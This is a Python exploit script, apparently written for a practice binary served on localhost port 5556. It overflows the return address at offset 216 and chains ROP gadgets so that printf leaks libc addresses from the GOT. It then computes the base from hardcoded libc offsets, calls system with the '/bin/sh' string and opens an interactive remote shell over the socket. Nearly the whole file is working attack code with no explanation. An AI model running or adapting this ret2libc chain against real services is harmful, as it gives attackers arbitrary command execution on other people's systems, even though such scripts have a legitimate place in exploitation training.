from telnetlib import Telnet
import socket
from utils import *

class atk:

    ADDR = "localhost"
    PORT = 5556

    RIP_OFFSET = 216

    PAD = b'A'
    PRINTF_PLT_ADDR = 0x401060
    PRINTF_STR_FORMAT_ADDR = 0x403018
    PRINTF_GOT_ADDR = 0x404018
    SCANF_GOT_ADDR = 0x404028
    POP_RSI_R15_RET_ADDR = 0x401281
    POP_RDI_RET_ADDR = 0x401283
    START_ADDR = 0x401090
    RET_ADDR = 0x401284  # for gadget(stack) alignment, if necessary

    PRINTF_BASE_ADDR = 0
    PRINTF_LIBC_OFFSET = 0

    SYSTEM_CALL_OFFSET = 0
    BINSH_STR_OFFSET = 0

    LIBC_BASE_ADDR = 0
    BINSH_STR_ADDR = 0
    SYSTEM_CALL_ADDR = 0

    def sock_init(self):

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.ADDR, self.PORT))

    def send_recv_libc_addrs(self, payload):

        self.sock.recv(1024)
        self.sock.send(payload)
        leaked = self.sock.recv(1024)

        leaked = leaked.split(b'received.')[1].split(b'Enter')[0]
        
        return leaked[:6], leaked[6:]

    def leak_libc_addrs(self):

        print("[i] Attepming to leak libc printf and scanf base addresses")

        #offset RIP: 216
        #payload = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9\n'

        payload = b''
        payload += self.PAD * self.RIP_OFFSET                   # pad

        payload += to_bytes(self.POP_RSI_R15_RET_ADDR)          # gadget
        payload += to_bytes(self.PRINTF_GOT_ADDR)                # printf argument in RSI
        payload += self.PAD * 8                                 

        payload += to_bytes(self.POP_RDI_RET_ADDR)              # gadget
        payload += to_bytes(self.PRINTF_STR_FORMAT_ADDR)        # printf %s format
        payload += to_bytes(self.PRINTF_PLT_ADDR)               # printf plt address (could be printf got plt directly)

        payload += to_bytes(self.POP_RSI_R15_RET_ADDR)          # gadget
        payload += to_bytes(self.SCANF_GOT_ADDR)                # printf argument in RSI
        payload += self.PAD * 8                                 

        payload += to_bytes(self.POP_RDI_RET_ADDR)              # gadget
        payload += to_bytes(self.PRINTF_STR_FORMAT_ADDR)        # printf %s format
        payload += to_bytes(self.PRINTF_PLT_ADDR)               # printf plt address (could be printf got plt directly)

        payload += to_bytes(self.START_ADDR)                    # _start address to loop back to beginning

        check_whitespaces(payload)
        payload += b'\n'

        printf_base_addr, scanf_base_addr = self.send_recv_libc_addrs(payload)

        while(len(printf_base_addr) < 8):
            printf_base_addr += b'\x00' 
        while(len(scanf_base_addr) < 8):
            scanf_base_addr += b'\x00'

        print(f"[*] libc base address: {hex(from_bytes(printf_base_addr))}, scanf base address: {hex(from_bytes(scanf_base_addr))}")
        self.PRINTF_BASE_ADDR = from_bytes(printf_base_addr)

    def start_shell_interact(self, payload):
        
        print("[i] Attepming remote shell interaction")
        self.sock.send(payload)

        try:
            while(True):
                
                print(self.sock.recv(4096).decode()[:-1])

                command = input("$ ")
                if(command == "EXITSHELL"):
                    break
                
                self.sock.send(f"{command}\n".encode())
        
        except KeyboardInterrupt:
            print("[!] Shell interaction stopped. Server process probably crashed")

    def start_shell(self):

        self.LIBC_BASE_ADDR = self.PRINTF_BASE_ADDR - self.PRINTF_LIBC_OFFSET

        self.BINSH_STR_ADDR = self.LIBC_BASE_ADDR + self.BINSH_STR_OFFSET
        self.SYSTEM_CALL_ADDR = self.LIBC_BASE_ADDR + self.SYSTEM_CALL_OFFSET

        payload = b''
        payload += self.PAD * self.RIP_OFFSET
        payload += to_bytes(self.POP_RDI_RET_ADDR)
        payload += to_bytes(self.BINSH_STR_ADDR)
        payload += to_bytes(self.RET_ADDR)
        payload += to_bytes(self.SYSTEM_CALL_ADDR)

        check_whitespaces(payload)
        payload += b'\n'

        self.start_shell_interact(payload)

a = atk()
a.sock_init()
a.leak_libc_addrs()

a.PRINTF_LIBC_OFFSET = 0x064e10

a.BINSH_STR_OFFSET = 0x1b75aa
a.SYSTEM_CALL_OFFSET = 0x055410
a.start_shell()


